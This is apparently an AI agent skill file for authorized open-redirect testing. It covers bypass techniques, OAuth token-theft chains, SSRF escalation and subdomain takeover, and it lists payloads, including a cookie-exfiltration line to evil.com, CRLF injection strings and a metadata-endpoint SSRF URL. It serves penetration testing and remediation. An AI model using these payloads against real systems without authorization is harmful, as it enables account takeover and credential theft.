---
name: open-redirect
description: "Canonical open-redirect capability: unvalidated redirects, bypass techniques (protocol-relative, userinfo, encoding, CRLF, javascript/data URIs), DOM-based redirects, OAuth redirect_uri token theft -> ATO, phishing chains, server-side redirect -> SSRF, and broken-link hijacking/subdomain takeover. Consolidates 3 sub-skills: exploiting-broken-link-hijacking, hunt-open-redirect, testing-for-open-redirect-vulnerabilities. Use when hunting or validating open-redirect-related vulnerabilities."
sources: consolidated
report_count: 28
---

# OPEN-REDIRECT — Canonical Capability

## 1. Identity and purpose

This is the single primary executable capability for open-redirect discovery, validation, and exploitation testing. It consolidates 3 previously separate sub-skills into one operational entry point while preserving all source content in `references/` and the original sub-skill directories for rollback.

Primary objectives:
- Discover endpoints that accept user-controlled redirect destinations (login/logout/OAuth/SSO/checkout flows).
- Validate server-side (3xx Location) and client-side (DOM/meta-refresh) redirects.
- Bypass naive validators using protocol-relative, userinfo, encoding, backslash, null-byte, whitespace, fragment, and case tricks.
- Chain open redirects into OAuth authorization-code/token theft -> ATO, phishing, session fixation, and SSRF.
- Assess broken-link hijacking and dangling-CNAME/subdomain-takeover opportunities that abuse trusted redirect targets.
- Produce reproducible, impact-rated findings with remediation guidance.

## 2. Scope

In scope:
- Unvalidated redirect / open redirect (server-side 301/302/303/307/308 Location).
- DOM-based open redirect (location.hash/search -> location.href/assign/replace/window.open).
- Meta-refresh and JavaScript-based redirects.
- OAuth/OIDC `redirect_uri` handling and open-redirect chaining (auth code/token theft).
- Server-side redirect followers -> SSRF escalation.
- CRLF/header injection in redirect Location.
- Broken link hijacking: expired/unclaimed external resources, dangling CNAMEs, subdomain takeover, external-script hijacking, supply-chain resource claims.
- Phishing amplification using trusted-domain redirect URLs.

Out of scope (hand off):
- Pure XSS discovery without redirect sink -> `xss` capability (escalate when `javascript:`/`data:` URI yields script execution).
- Subdomain takeover execution details beyond redirect context -> `hunt-subdomain` capability (chain here once a trusted origin is controlled).
- SSRF exploitation depth beyond redirect follower -> `ssrf` capability.
- OAuth protocol misconfiguration beyond redirect_uri -> `oauth` capability.

## 3. Invocation and routing

Use this capability when:
- A URL parameter resembles a redirect target (`redirect`, `next`, `url`, `return`, `goto`, `dest`, `location`, `target`, `callback`, `redirect_uri`, `success_url`, `cancel_url`).
- Login/logout/SSO/OAuth/checkout flows accept a return/destination URL.
- You are hunting open redirects for phishing or token-theft chains.
- You are assessing broken external references / dangling CNAMEs for hijacking.

Routing notes:
- Start with `references/hunt-open-redirect.md` for hunting methodology, bypass table, and OAuth chain tests.
- Use `references/testing-for-open-redirect-vulnerabilities.md` for step-by-step testing, bypass payloads, and reporting templates.
- Use `references/exploiting-broken-link-hijacking.md` for broken-link/subdomain-takeover methodology.
- Chain to `oauth` for redirect_uri validation depth, `ssrf` for server-side redirect followers, `xss` for `javascript:`/`data:` URI script execution, `hunt-subdomain` for takeover execution.

## 4. Inputs and outputs

Inputs:
- Target base URLs, endpoint inventory, and crawl output.
- Session cookies / authentication material for credentialed flows (login/logout/OAuth).
- Optional: OAuth client_id, redirect_uri allowlist observations, Burp Suite project, browser automation, attacker-controlled domain/Collaborator (oastify) endpoint, wordlists.

Outputs:
- Confirmed or refuted open-redirect findings with raw request/response and browser follow proof.
- Redirect-parameter inventory and validation matrix (tested payloads vs reflected Location).
- Bypass-technique classification per endpoint.
- OAuth chain assessment (auth-code/token theft feasibility).
- Broken-link/subdomain-takeover candidate inventory.
- Reproduction steps, impact assessment, and remediation guidance.
- False-positive rulings with disproof rationale.

## 5. Preconditions and authorization

- Confirm written authorization and scope before testing; include target domains, test accounts, and OAuth clients.
- Use only test accounts and non-production data unless explicitly authorized.
- Respect rate limits and avoid destructive operations on shared resources.
- Do not access other users' data beyond proof of control.
- Host PoC pages only on attacker infrastructure you control; do not leave phishing pages collecting real credentials.
- Document any out-of-scope endpoint discovered and hand off rather than exploit.
- For broken-link hijacking, only claim expired resources as a benign PoC under authorization.

## 6. Reconnaissance

Recon steps:
1. Crawl the target (Burp Spider, Scrapy, wayback) and collect all URLs; grep redirect-candidate parameters.
2. Extract redirect params with `gf redirect` and additional names (`return`, `next`, `dest`, `go`, `forward`, `location`, `to`, `jump`, `target`, `out`, `link`, `logout`, `redirect_uri`, `callback`, `checkout_url`, `success_url`, `cancel_url`).
3. Identify login/logout/SSO/OAuth/checkout flows and their redirect parameters.
4. Harvest client-side JS sinks (`location =`, `location.href/assign/replace`, `window.open`) fed by `location.hash`/`location.search`/`URLSearchParams`/`getParameter`/`referrer`.
5. Collect external references (scripts/domains/CNAMEs) for broken-link-hijacking assessment.
6. Check OAuth metadata (`/.well-known/openid-configuration`) for authorization endpoints and redirect_uri handling.

See `references/hunt-open-redirect.md` (Attack Surface Signals, Phase 1) and `references/testing-for-open-redirect-vulnerabilities.md` (Step 1).

## 7. Detection methodology

Core detection flow:
1. Discover redirect-emitting endpoints and record baseline (status, Location, body).
2. Test basic external destination (`https://evil.com`, `//evil.com`) and record whether Location reflects it.
3. Classify validator behavior and apply bypass techniques from the bypass table (Phase 3).
4. Test DOM-based redirects in a real browser (curl cannot observe client-side navigation).
5. Test meta-refresh and JavaScript redirects.
6. For OAuth, test whether `redirect_uri` accepts an open redirect on a trusted domain; assess auth-code/token theft.
7. For server-side redirect followers, test SSRF escalation via followed redirect.
8. For broken links, crawl external references, check DNS/CNAME resolution and domain availability, identify claimable cloud resources.
9. Validate each candidate with a second independent request/account and mark refuted if not proven.

References by phase:
- Hunting: `references/hunt-open-redirect.md`.
- Testing/PoC/reporting: `references/testing-for-open-redirect-vulnerabilities.md`.
- Broken link hijacking: `references/exploiting-broken-link-hijacking.md`.

## 8. Technique selection

Select techniques by observed behavior:
- `Location` reflects arbitrary URL verbatim -> basic open redirect (High if chained to OAuth, else Low/Medium).
- Validator blocks `https://evil.com` but allows `//evil.com` -> protocol-relative bypass.
- Validator checks prefix/contains trusted domain -> userinfo (`https://target.com@evil.com`), subdomain (`target.com.evil.com`), fragment (`evil.com#.target.com`), suffix tricks.
- Validator decodes once -> double-encoding (`%252F`).
- Validator is case-sensitive on scheme -> mixed case (`HtTpS://`).
- Backslash confusion (`/\evil.com`) where parser treats `\` as path separator.
- Null byte / whitespace truncation (`evil.com%00.target.com`, `%09`, `%20`).
- CRLF injection (`%0d%0aLocation: https://evil.com`) -> response splitting.
- Client-side only -> DOM-based redirect (test in browser).
- `javascript:`/`data:` URI accepted -> XSS via redirect (chain to xss).
- OAuth `redirect_uri` allows open redirect on trusted domain -> auth-code/token theft -> ATO (Critical).
- Server follows redirect -> SSRF (chain to ssrf).
- Broken external reference / dangling CNAME -> claim resource -> content injection/XSS/subdomain takeover.

## 9. Execution steps

1. Establish baseline request per endpoint (method, headers, body, auth) and record status + Location + body.
2. Replay with one controlled change at a time (redirect param values); record status, headers, body, timing.
3. Use the bypass table to choose payloads systematically; do not guess.
4. Test server-side (curl) and client-side (browser) separately; curl cannot observe DOM redirects.
5. For null origin / sandboxed contexts follow the relevant PoC guidance.
6. For OAuth, construct authorize URL with open redirect embedded in `redirect_uri` (URL-encoded) and observe where the code is delivered.
7. For server-side followers, test redirect to internal/metadata endpoints.
8. For broken links, crawl, check DNS/CNAME resolution and domain availability, identify claimable cloud resources; verify with benign PoC only.
9. Confirm exploitability with a clean reproduction (hosted PoC + screenshot/console/OOB hit).
10. Stop and document when a vector is not exploitable or out of scope.

## 10. Tool usage

- Proxy: Burp Suite (Repeater, Intruder, Comparer, Logger++, DOM Invader), OWASP ZAP.
- Crawlers: Burp Spider, Scrapy, wayback machine, gau, katana.
- Parameter extraction: `gf redirect`, qsreplace.
- Fuzzers: ffuf, openredirex, OpenRedireX.
- Scanners: nuclei (redirect templates), OWASP ZAP.
- DNS/takeover: dig, whois, subjack, nuclei takeover templates, subfinder, can-i-take-over-xyz, BadDNS.
- Cloud CLIs: aws s3, az, gcloud for claimable resource verification.
- Browser: Chrome/Firefox DevTools for DOM redirects and PoC hosting.
- Automation: Python requests/httpx, curl, jq.
- Evidence: screenshots, saved requests/responses, canary values, OOB interactions, collaborator hits.

See `references/hunt-open-redirect.md` (Automation), `references/testing-for-open-redirect-vulnerabilities.md` (Tools & Systems), and `references/exploiting-broken-link-hijacking.md` (Tools & Systems).

## 11. Payloads and test cases

Representative test cases (adapt to target):

Basic:
- `https://evil.com`
- `//evil.com`
- `/\evil.com` (backslash)
- `https://target.com@evil.com` (userinfo)
- `https://evil.com#.target.com` (fragment)
- `https://evil.com%09` / `%20` (whitespace)
- `evil.com%00.target.com` (null byte)
- `https://target.com.evil.com` (subdomain confusion)
- `%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d` (URL encoding)
- `%2568%2574...` (double encoding)
- `HtTpS://evil.com` (mixed case)
- `%0d%0aLocation:%20https://evil.com` (CRLF)

JavaScript/XSS:
- `javascript:alert(document.domain)`
- `javascript:fetch('https://evil.com/?c='+document.cookie)`
- `data:text/html,<script>alert(1)</script>`

DOM-based:
- `https://target.com/page#https://evil.com`
- `https://target.com/page?url=https://evil.com` (client sink)

OAuth chain:
- `redirect_uri=https://target.com/redirect?url=https://evil.com` (URL-encoded)

Server-side SSRF:
- `https://target.com/proxy?url=https://evil.com/redirect-to-169.254.169.254/latest/meta-data/`

Broken link / takeover:
- Dangling CNAME: `subdomain.target.com -> unclaimed.github.io` / S3 bucket / Azure blob / Heroku app.
- Expired external script domain referenced by target.

Framework and variant details live in the corresponding references.

## 12. Evidence

Each finding must include:
- Exact request and response (raw HTTP or browser network capture) showing the redirect.
- Authentication context and account/role used.
- Parameter tested and payload used.
- Whether the browser actually follows the redirect to the attacker-controlled destination.
- For bypass: the specific bypass class and why the validator failed.
- For DOM-based: source (hash/search/referrer) -> sink (location.href/assign/replace/window.open) code path and browser proof.
- For OAuth: authorize request, delivered Location, and where the auth code/token lands.
- For SSRF: internal endpoint reached and response evidence.
- For broken-link: resource reference, DNS/CNAME state, availability proof, and benign PoC.
- Impact assessment and affected user/data scope.

## 13. Reproduction and validation

- Reproduce server-side redirects with curl (`--max-redirs 0`) and capture Location header.
- Reproduce client-side redirects in a real browser; curl cannot observe DOM navigation.
- Validate OAuth chains end-to-end with a test client and a controlled redirect target; confirm the code/token is delivered to the attacker.
- Validate SSRF via OOB/ Collaborator or controlled internal endpoint.
- Validate broken-link takeover with a benign PoC page only (authorized).
- Mark as refuted if the Location does not point to an attacker-controlled destination, the browser blocks navigation, or the chain cannot be demonstrated.

## 14. False-positive rejection

Reject or downgrade when:
- The redirect only goes to a relative path or same-origin destination.
- The `Location` header is set but the browser does not follow (e.g., 200 with meta refresh only, or status not 3xx).
- The validator correctly rejects external destinations for all tested bypass classes.
- The reflected origin/destination is not attacker-controllable (e.g., `evil.target.com` without takeover).
- OAuth `redirect_uri` is strictly allowlisted with exact string matching; the open redirect is not accepted as `redirect_uri`.
- Server-side redirect follower does not actually follow redirects or blocks internal targets.
- Broken link is not actually claimable (domain registered, bucket name taken, CNAME resolves).
- Response differences are due to caching, localization, or benign metadata.
- Framework defaults or dev-only routes are not reachable in production.

## 15. Impact

Impact guidance:
- Critical: open redirect -> OAuth auth-code/token theft -> ATO; server-side redirect -> SSRF to metadata/internal services with sensitive data.
- High: open redirect chained to phishing with credential harvesting on trusted domain; `javascript:`/`data:` URI -> XSS on sensitive app; broken-link hijacking of external script -> full XSS on all visitors.
- Medium: open redirect on authenticated flow enabling session fixation or referer leakage; subdomain takeover -> cookie theft/phishing.
- Low: standalone open redirect usable for phishing (most programs).
- Informational: open redirect only to same-origin/relative paths; dead link with no claimable resource.

Always tie impact to business risk, chain feasibility, and data scope; avoid severity inflation from redirect presence alone.

## 16. Reporting

Report template:
- Summary: endpoint, vulnerability type, redirect condition, impact.
- Scope/authorization: test window, attacker-controlled domain.
- Steps to reproduce: numbered, minimal; include PoC host location.
- Proof of concept: raw request/response, hosted HTML, screenshot/console/OOB hit, OAuth code delivery evidence.
- Validation matrix: tested payloads vs reflected Location.
- Chain analysis: OAuth/SSRF/phishing feasibility and impact.
- Broken-link inventory and takeover evidence (if applicable).
- Impact: business and data scope.
- Remediation: strict allowlist of permitted redirect destinations (exact string match, not substring/regex); reject external domains and dangerous schemes (`javascript:`, `data:`, `vbscript:`); use indirect reference maps; validate and normalize URLs server-side with a strict parser; reject protocol-relative and userinfo tricks; for OAuth, exact-match `redirect_uri` allowlist per client; remove dangling CNAMEs; implement SRI for external scripts; regular dependency audits.

## 17. Failure modes

- Surface not fully discovered -> expand recon, check mobile/SPA, versions, content types, JS bundles.
- No test account -> request credentials or scope clarification; do not bypass without authorization.
- WAF/gateway blocks payloads -> try content-type confusion, encoding, version downgrade, or parser differentials.
- Rate limiting stops testing -> coordinate throttling, use allowed test windows, or hand off.
- Browser blocks navigation -> re-evaluate; likely not a finding or needs different scheme.
- Validator class unclear -> test all bypass classes systematically and record server responses.
- OAuth flow opaque -> request client registration details or inspect JS/HTML for authorize endpoint.
- Broken-link claim inconclusive -> verify DNS resolution, domain availability, and cloud resource state with multiple tools.
- Inconclusive authorization/redirect result -> repeat with fresh sessions and diff responses; mark as not confirmed if ambiguous.

## 18. References

All 3 sub-skill references are preserved and must resolve:

| Reference | Sub-capability | Load when |
|---|---|---|
| `references/hunt-open-redirect.md` | `hunt-open-redirect` | Hunting methodology, bypass table, OAuth/SSRF chains, automation |
| `references/testing-for-open-redirect-vulnerabilities.md` | `testing-for-open-redirect-vulnerabilities` | Step-by-step testing, bypass payloads, reporting templates |
| `references/exploiting-broken-link-hijacking.md` | `exploiting-broken-link-hijacking` | Broken-link, dangling CNAME, subdomain takeover methodology |

Original sub-skills remain intact under `exploiting-broken-link-hijacking/`, `hunt-open-redirect/`, and `testing-for-open-redirect-vulnerabilities/`.

## 19. Testing and mastery

- Validate with the capability tests in `tests/test_open_redirect_capability.py`.
- Confirm all referenced files resolve and are non-empty.
- Confirm migration map paths/hashes/status are accurate.
- Practice on authorized labs: PortSwigger open-redirect labs, OWASP crAPI, OAuth/OIDC labs, subdomain-takeover challenges.
- Mastery criteria: independently discover, validate (server + browser), chain, and report an open-redirect finding with full reproduction, impact, and remediation.


## Knowledge sources

- WKS bug classes: open_redirect
- Domain knowledge: open_redirect
- WKS remains the structured source of truth; retrieve and validate items through WKS rather than duplicating the full corpus in this skill.
- Research and learning material is mapped in `stage-a/knowledge-source-map.json` and must be validated before promotion.
